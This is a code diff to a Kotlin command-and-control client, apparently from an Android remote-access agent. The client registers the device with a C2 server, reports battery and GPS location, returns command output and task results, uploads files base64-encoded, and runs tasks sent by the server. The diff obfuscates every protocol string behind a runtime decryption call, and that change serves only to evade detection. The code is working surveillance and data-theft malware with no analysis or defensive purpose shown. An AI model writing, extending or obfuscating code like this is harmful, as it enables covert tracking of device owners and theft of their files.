@@ -23,6 +23,8 @@ class C2Client(
     var connected = false
         private set
 
+    private fun k(e: String) = Crypt.d(e)
+
     fun connect() {
         try {
             socket = Socket(Config.C2_HOST, Config.C2_PORT).apply {
@@ -49,54 +51,54 @@ class C2Client(
 
     private fun register() {
         val info = JSONObject().apply {
-            put("type", "register")
-            put("agent_id", agentId)
-            put("hostname", Build.MODEL)
-            put("os", "Android ${Build.VERSION.RELEASE}")
-            put("platform", "android")
-            put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
-            put("sdk", Build.VERSION.SDK_INT)
+            put(k("LiIsOA=="), k("KD47NC0rBSg="))
+            put(k("Ozw5MyoACT4="), agentId)
+            put(k("MjQvKTA+DT8="), Build.MODEL)
+            put(k("NSg="), "Android ${Build.VERSION.RELEASE}")
+            put(k("Kjc9KTgwEjc="), "android")
+            put(k("NzQ4ODI="), "${Build.MANUFACTURER} ${Build.MODEL}")
+            put(k("KT83"), Build.VERSION.SDK_INT)
         }
         sendMsg(info)
     }
 
     fun sendHeartbeat(battery: Int, gps: String?) {
         val hb = JSONObject().apply {
-            put("type", "heartbeat")
-            put("agent_id", agentId)
-            put("battery", battery)
-            if (gps != null) put("last_gps", gps)
+            put(k("LiIsOA=="), k("Mj49Lyo9BTsv"))
+            put(k("Ozw5MyoACT4="), agentId)
+            put(k("ODooKTstGQ=="), battery)
+            if (gps != null) put(k("NjovKQE4ECk="), gps)
         }
         sendMsg(hb)
     }
 
     fun sendResult(taskId: String, data: JSONObject) {
         val msg = JSONObject().apply {
-            put("type", "result")
-            put("agent_id", agentId)
-            put("task_id", taskId)
-            put("data", data)
+            put(k("LiIsOA=="), k("KD4vKDIr"))
+            put(k("Ozw5MyoACT4="), agentId)
+            put(k("LjovNgE2BA=="), taskId)
+            put(k("PjooPA=="), data)
         }
         sendMsg(msg)
     }
 
     fun sendOutput(text: String) {
         val msg = JSONObject().apply {
-            put("type", "output")
-            put("agent_id", agentId)
-            put("text", text)
+            put(k("LiIsOA=="), k("NS4oLSsr"))
+            put(k("Ozw5MyoACT4="), agentId)
+            put(k("Lj4kKQ=="), text)
         }
         sendMsg(msg)
     }
 
     fun sendFileData(taskId: String, filename: String, fileBytes: ByteArray) {
         val msg = JSONObject().apply {
-            put("type", "file_data")
-            put("agent_id", agentId)
-            put("task_id", taskId)
-            put("filename", filename)
-            put("size", fileBytes.size)
-            put("data", Base64.encodeToString(fileBytes, Base64.NO_WRAP))
+            put(k("LiIsOA=="), k("PDIwOAE7AS46"))
+            put(k("Ozw5MyoACT4="), agentId)
+            put(k("LjovNgE2BA=="), taskId)
+            put(k("PDIwODA+DT8="), filename)
+            put(k("KTImOA=="), fileBytes.size)
+            put(k("PjooPA=="), Base64.encodeToString(fileBytes, Base64.NO_WRAP))
         }
         sendMsg(msg)
     }
@@ -106,7 +108,7 @@ class C2Client(
             try {
                 val msg = recvMsg() ?: break
                 val task = JSONObject(msg)
-                if (task.optString("type") == "task") {
+                if (task.optString(k("LiIsOA==")) == k("LjovNg==")) {
                     taskRouter.dispatch(task)
                 }
             } catch (e: Exception) {
